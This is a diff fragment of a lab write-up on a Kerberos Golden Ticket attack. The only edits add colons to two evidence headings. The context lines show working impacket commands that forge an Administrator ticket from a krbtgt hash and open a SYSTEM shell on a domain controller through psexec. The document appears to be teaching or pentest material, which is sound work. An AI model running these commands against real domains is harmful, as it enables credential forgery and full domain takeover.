@@ -18,7 +18,7 @@ Using the krbtgt hash, supplied by a previous DCSync Attack, an attacker can cre
 
 ## Evidence
 
-### Evidence (A) Using the krbtgt hash a Golden Ticket can be created and exported for the attack.
+### Evidence (A) : Using the krbtgt hash a Golden Ticket can be created and exported for the attack.
 
 ```bash
 impacket-ticketer -nthash b207f3a04617ddbb7249b71872abcf64 -domain lab.local -domain-sid S-1-5-21-3626527385-2561858057-3809917543 -groups 512,513,518,519,520 Administrator
@@ -45,7 +45,7 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 export KRB5CCNAME=Administrator.ccache
 ```
 
-### Evidence (B) Using the Golden Ticket, an `NT AUTHORITY/SYSTEM` shell (System Shell) can be spawned in multiple ways.
+### Evidence (B) : Using the Golden Ticket, an `NT AUTHORITY/SYSTEM` shell (System Shell) can be spawned in multiple ways.
 
 ```
 impacket-psexec -k -no-pass lab.local/Administrator@DC01-WindowsServer2019.lab.local
